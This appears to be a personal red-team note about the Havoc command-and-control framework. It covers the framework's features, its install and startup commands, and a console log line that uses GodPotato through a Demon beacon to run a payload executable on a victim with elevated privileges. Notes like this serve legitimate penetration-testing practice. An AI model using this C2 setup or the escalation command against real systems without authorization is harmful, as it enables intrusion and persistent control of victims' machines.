Havoc is a modern and malleable post-exploitation command and control framework.
![[Pasted image 20240815100327.png]]
Reference: [GitHub - HavocFramework/Havoc: The Havoc Framework.](https://github.com/HavocFramework/Havoc)


## What can be used for?
As the description implies, it is used as "post-exploitation" toolkit to easily keep all the connection to the victim hosts up and running(even post reboot), which gives you sort of "persistence".
None the less the tool includes a plethora of modules that can be useful like file explorer with file upload/download feature, pivoting, PowerShell command line to victim, mimikatz, load dll shellcode straight into memory and many more.


## How to install?
Follow the wiki from the developer from this site: [1. Installation.md | Havoc Documentation (havocframework.com)](https://havocframework.com/docs/installation)
At the end you will have 2 working folders, one for the server(the workhorse basically) and one for the front-end client with gives you a nice web gui that let's you easily work together with your colleagues.

```
//Install required packages: 
sudo apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev python3-dev libboost-all-dev mingw-w64 nasm

//Clone repository: 
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

//Install teamserver & client
cd teamserver
go mod download golang.org/x/sys
go mod download github.com/ugorji/go
cd ..
make ts-build
make client-build
```


## Profiles
Profiles are used both by server and client binary to load specifical configurations during startup process which allows you virtually to configure the environment as you like.
All the configuration files are saved in Yaml description files, for more information see here: 
[5. Listeners.md | Havoc Documentation (havocframework.com)](https://havocframework.com/docs/listeners)

- **Server config:** allows you to choose which PORT/IP where the server is running at, Users that are allowed to login etc. Edit the yaml config file at **./profiles/havoc.yaotl** to add/remove the users that are allow to login, and eventual listening port for the team server.
- **Client config:** holds the config needed to login back to the team server.


## How to run it ?
Start the team server
```
./havoc server --profile ./profiles/havoc.yaotl -v --debug
```

Run the client to get the webgui
```
./havoc client
```


## Good to know commands...
If you want to elevate you shell(ex. by leveraging over Impersonation) permission you can upload a Havoc beacon to the victim and get a normal shell as you initial user. 
```shell-session
07/10/2024 14:18:39 [user] Demon Â» dotnet execute-inline /home/user/Downloads/GodPotato-NET4.exe -cmd "C:\web\culo.exe"
```
This will sideload the binary directly from your machine without the need to upload the shell again.